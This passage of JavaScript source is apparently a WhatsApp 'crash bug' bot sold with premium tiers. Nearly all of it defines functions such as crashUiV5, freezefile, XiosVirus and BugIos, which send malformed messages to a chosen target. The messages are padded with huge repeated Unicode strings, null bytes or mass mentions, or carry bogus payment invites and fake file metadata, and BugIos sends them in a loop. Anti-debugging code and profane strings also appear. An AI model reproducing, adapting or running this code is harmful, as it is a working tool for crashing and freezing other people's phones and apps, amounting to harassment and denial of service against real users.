                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi"
                    },
                    contentText: "- Kami Yo \"👋\"",
                    footerText: "© GalaxyAndro",
                    buttons: [
                        {
                            buttonId: "\u0000".repeat(850000),
                            buttonText: {
                                displayText: "👾 𝗚𝗮𝗹𝗮𝘅𝘆𝗔𝗻𝗱𝗿𝗼"
                            },
                            type: 1
                        }
                    ],
                    headerType: 3
                }
},
conversionSource: "porn",
conversionData: crypto.randomBytes(16),
conversionDelaySeconds: 9999,
forwardingScore: 999999,
isForwarded: true,
quotedAd: {
advertiserName: " x ",
mediaType: "IMAGE",
jpegThumbnail: tdxlol,
caption: " x "
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: -99999,
ephemeralSettingTimestamp: Date.now(),
ephemeralSharedSecret: crypto.randomBytes(16),
entryPointConversionSource: "kontols",
entryPointConversionApp: "kontols",
actionLink: {
url: "t.me/bagazzmodz",
buttonTitle: "konstol"
},
disappearingMode:{
initiator:1,
trigger:2,
initiatorDeviceJid: target,
initiatedByMe:true
},
groupSubject: "kontol",
parentGroupJid: "kontolll",
trustBannerType: "kontol",
trustBannerAction: 99999,
isSampled: true,
externalAdReply: {
title: "I Hate You!🩸",
mediaType: 2,
renderLargerThumbnail: false,
showAdAttribution: false,
containsAutoReply: false,
body: "© running since 2020 to 20##?",
thumbnail: tdxlol,
sourceUrl: "go fuck yourself",
sourceId: "dvx - problem",
ctwaClid: "cta",
ref: "ref",
clickToWhatsappCall: true,
automatedGreetingMessageShown: false,
greetingMessageBody: "kontol",
ctaPayload: "cta",
disableNudge: true,
originalImageUrl: "konstol"
},
featureEligibilities: {
cannotBeReactedTo: true,
cannotBeRanked: true,
canRequestFeedback: true
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363274419384848@newsletter",
serverMessageId: 1,
newsletterName: `- GalaxyAndro 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "kontol"
},
statusAttributionType: 2,
utm: {
utmSource: "utm",
utmCampaign: "utm2"
}
},
description: "by : BagazzModz"
},
messageContextInfo: {
messageSecret: crypto.randomBytes(32),
supportPayload: JSON.stringify({
version: 2,
is_ai_message: true,
should_show_system_message: true,
ticket_id: crypto.randomBytes(16),
}),
},
}
}
}

await gal.relayMessage(target, messagePayload, {
additionalNodes: stanza,
participant: { jid : target }
});
}
     	async function freezefile(target, QBug, Ptcp = true) {
    let virtex = "👾 𝗚𝗮𝗹𝗮𝘅𝘆𝗔𝗻𝗱𝗿𝗼" + "ꦾ".repeat(250000) + "@0".repeat(250000);
    await gal.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "Wkwk.",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function buginvite(target, ptcp = true) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "👾 𝗚𝗮𝗹𝗮𝘅𝘆𝗔𝗻𝗱𝗿𝗼" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, // 21 hari
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0000".repeat(500000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "AndroMax" ,
                    },
                ],
            },
        };

        await gal.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}
async function crashUiV5(target, Ptcp = false) {
    gal.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "👾 𝗚𝗮𝗹𝗮𝘅𝘆𝗔𝗻𝗱𝗿𝗼" + "@0".repeat(250000) + "ꦾ".repeat(100000)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "call_permission_request",
                                buttonParamsJson: {}
                            }
                        ]
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [
                            {
                                groupJid: "0@s.whatsapp.net",
                                groupSubject: "AndroMax" 
                            }
                        ]
                    }
                }
            }
        }
    }, { participant: { jid: target }, messageId: null });
};
async function systemUi(target, Ptcp = false) {
    gal.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "ꦾ".repeat(250000) + "@0".repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "AndroMax"  }]
                    }
                }
            }
        }
    }, { participant: { jid: target },  messageId: null });
};
async function systemUi2(target, Ptcp = false) {
    gal.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "ꦾ".repeat(250000) + "@0".repeat(100000)
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "GalaxyAndro",
                        buttons: [
                            {
                                name: "quick_reply",
                                buttonParamsJson: "{\"display_text\":\"GalaxyAndro!\",\"id\":\".groupchat\"}"
                            },
                            {
                                name: "single_select",
                                buttonParamsJson: {
                                    title: "GalaxyAndro",
                                    sections: [
                                        {
                                            title: "GalaxyAndro",
                                            rows: []
                                        }
                                    ]
                                }
                            }
                        ]
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "AndroMax"  }]
                    }
                }
            }
        }
    }, { participant: { jid: target }, messageId: null });
}
	async function crashui2(target, ptcp = false) {
    await gal.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Wanna With Yours. :D" + "ꦾ".repeat(300000)  + "@1".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " xCeZeT " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function sendOfferCall(target) {
    try {
        await gal.offerCall(target);
        console.log(chalk.white.bold(`Success Send Offer Call To Target`));
    } catch (error) {
        console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
    }
}
async function InVisiLoc(target, ptcp = false) {
    let etc = generateWAMessageFromContent(target,
        proto.Message.fromObject({
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏",
                            "locationMessage": {
                                "degreesLatitude": -999.03499999999999,
                                "degreesLongitude": 922.999999999999,
                                "name": "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉",
                                "address": "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
                                "jpegThumbnail": o,
                            },
                            hasMediaAttachment: true
                        },
                        body: {
                            text: ""
                        },
                        nativeFlowMessage: {
                            messageParamsJson: " 𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️ ",
                            buttons: [{
                                    name: "call_permission_request",
                                    buttonParamsJson: {}
                                }
                            ],
                        },
                    }
                }
            }
        }), {
            userJid: target,
            quoted: QBug
        }
    );
    await gal.relayMessage(target, etc.message, ptcp ? {
        participant: {
            jid: target
        }
    } : {});
    console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
};
async function bokep(target, ptcp = false) {
    await gal.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Wanna With Yours. :D" + "ꦾ".repeat(3)
                    },
                    nativeFlowMessage: {
                        "buttons": [
                            {
                                "name": "cta_url",
                                "buttonParamsJson": "{\"display_text\":\"YouTube 🍒\",\"url\":\"https://youtube.com/@dgxeon\",\"merchant_url\":\"https://www.google.com\"}"
                            },
                            {
                                "name": "cta_url",
                                "buttonParamsJson": "{\"display_text\":\"Telegram 💙\",\"url\":\"https://t.me/+WEsVdEN2B9w4ZjA9\",\"merchant_url\":\"https://www.google.com\"}"
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": "{\"display_text\":\"Owner 👤\",\"title\":\"Owner 👤\",\"id\":\".owner\"}"
                            }
                        ],
                        "messageParamsJson": "{\"caption\":\"Halo\"}"
                    },
                    contextInfo: {
                        mentionedJid: [
                            "6285727763935@s.whatsapp.net"
                        ]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function sendContact(target) {
    const vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:GalaxyAndro\nTEL:+6283197979544\nEND:VCARD`;

    await gal.relayMessage(target, {
        contactMessage: {
            contacts: [
                {
                    displayName: "👾 𝗚𝗮𝗹𝗮𝘅𝘆𝗔𝗻𝗱𝗿𝗼",
                    jid: "+6283197979544@s.whatsapp.net",
                    vcard: vcard
                }
            ]
        }
    }, { participant: { jid: target } }, { messageId: null });
}
//bug ios
async function UpiCrash(target) {
      await gal.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function VenCrash(target) {
      await gal.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "VENMO",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function AppXCrash(target) {
      await gal.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "CASHAPP",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function SmCrash(target) {
      await gal.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "SAMSUNGPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function SqCrash(target) {
      await gal.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "SQUARE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function FBiphone(target) {
      await gal.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "FBPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QXIphone(target) {
      let CrashQAiphone = "𑇂𑆵𑆴𑆿".repeat(60000);
      await gal.relayMessage(
        target,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: CrashQAiphone,
            url: "https://t.me/bagazzmodz",
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }
        async function bug_notif(target) {
			await gal.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "\u0000",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: 'https://i.top4top.io/p_32261nror0.jpg',
									},
									hasMediaAttachment: true,
								},
								body: { 
					         text: "ꦾ".repeat(250000) + "@0".repeat(100000)
								},
								nativeFlowMessage: {
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["0@s.whatsapp.net", ...Array.from({
										length: 10000
									}, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "\u0000",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				},
				{
					participant: {
						jid: target
					}
				}
			);
		};
     
    async function QPayIos(target) {
      await gal.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "PAYPAL",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QPayStriep(target) {
      await gal.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "STRIPE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QDIphone(target) {
      gal.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "ꦾ".repeat(55000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "Maaf Kak" + "ꦾ࣯࣯".repeat(50000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }

    //

    async function IosMJ(target, Ptcp = false) {
      await gal.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "Wanna With Yours :)" + "ꦾ".repeat(90000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "Ueheheheeh",
                body: "Kmu Ga Masalah Kan?" + "𑜦࣯".repeat(200),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/bagazzmodz",
                mediaUrl: "https://t.me/bagazzmodz",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://t.me/bagazzmodz",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbcayCampaignId: "smb_cay_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }
    async function XiosVirus(target) {
      gal.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `Wanna With Yours :D -` + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "Gpp Yah:D ‌" + "ꦾ".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }
    async function BugIos(target) {
      for (let i = 0; i < 15; i++) {
        await IosMJ(target, true);
        await XiosVirus(target);
        await QDIphone(target);
        await QPayIos(target);
        await QPayStriep(target);
        await FBiphone(target);
        await VenCrash(target);
        await AppXCrash(target);
        await SmCrash(target);
        await SqCrash(target);
        await IosMJ(target, true);
        await XiosVirus(target);
      }
      console.log(
        chalk.red.bold(
          `Wanna With Yours :)!`
        )
      );
    }
    bot.launch().then(() => {
  const systemInfo = getSystemInfo();
  sendMessageToMe('Bot sudah terhubung dan mengirim pesan ke Anda!\n' + systemInfo);
});
setInterval(() => {
    const now = Date.now();
    Object.keys(usersPremium).forEach(userId => {
        if (usersPremium[userId].premiumUntil < now) {
            delete usersPremium[userId];
        }
    });
    Object.keys(botSessions).forEach(botToken => {
        if (botSessions[botToken].expiresAt < now) {
            delete botSessions[botToken];
        }
    });
    fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify(usersPremium));
}, 60 * 60 * 1000); // Check every hour

function detectDebugger() {
  const start = Date.now();
  debugger;
  if (Date.now() - start > 100) {
    console.error("Debugger detected! Exiting...");
    process.exit(1);
  }
}

setInterval(detectDebugger, 5000);
const os = require('os');

// BOT WHATSAPP
